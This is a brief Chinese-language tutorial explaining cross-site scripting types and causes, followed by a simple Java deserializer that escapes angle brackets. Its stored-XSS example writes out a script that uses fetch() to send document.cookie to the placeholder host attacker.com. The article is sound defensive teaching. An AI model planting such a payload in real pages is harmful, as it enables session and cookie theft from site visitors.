---
title: XSS 攻击
createTime: 2025/04/17 10:26:28
permalink: /article/1bartf38/
---

# XSS跨站脚本攻击

## 1. What - 什么是XSS？
XSS（Cross-Site Scripting）是一种将恶意脚本注入到可信网站中的攻击方式。攻击者利用网站对用户输入的过滤不足，在页面中执行非法的 JavaScript 代码。

**典型特征：**
- 恶意脚本在受害者浏览器执行
- 窃取Cookie/会话信息
- 篡改页面内容
- 传播蠕虫病毒

## 2. Why - 为什么存在XSS？
- 网站未对用户输入进行充分过滤
- 动态渲染内容时未正确处理特殊字符
- 过度信任客户端数据

## 3. When - 什么场景会发生？
- 用户提交评论/留言时（存储型XSS）
- 点击恶意构造的URL链接（反射型XSS）
- 访问被篡改的第三方资源（DOM型XSS）

## 4. How - 攻击如何实现？
### 存储型XSS案例
```javascript
// 恶意评论内容
<script> 
  fetch('https://attacker.com/steal?cookie='+document.cookie)
</script>
```
### 如何避免 XSS 攻击

在后端开发时可以过滤全局的特殊字符
```java 
@JsonComponent
public class GlobalJsonDeserializer {
    private GlobalJsonDeserializer() {
        throw new UnsupportedOperationException("JsonDeserializer classes cannot be instantiated");
    }
    public static class StringDeserializer extends JsonDeserializer<String> {
        @Override
        public String deserialize(JsonParser jsonParser, DeserializationContext deserializationContext) throws IOException {
            return jsonParser.getValueAsString()
                    .replace("<", "&lt;")
                    .replace(">", "&gt;");
        }
    }
}
```